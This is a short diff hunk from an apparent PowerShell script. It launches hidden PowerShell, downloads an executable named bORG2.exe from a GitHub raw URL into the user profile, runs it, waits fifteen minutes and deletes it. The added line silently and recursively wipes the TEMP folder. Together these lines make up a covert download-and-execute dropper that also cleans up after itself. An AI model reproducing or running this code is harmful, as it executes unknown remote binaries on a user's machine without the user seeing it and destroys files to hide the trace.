@@ -2,3 +2,4 @@ powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/bORG
 start-process "$env:USERPROFILE\bORG2.exe"
 start-sleep 900
 rm "$env:USERPROFILE\bORG2.exe"
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
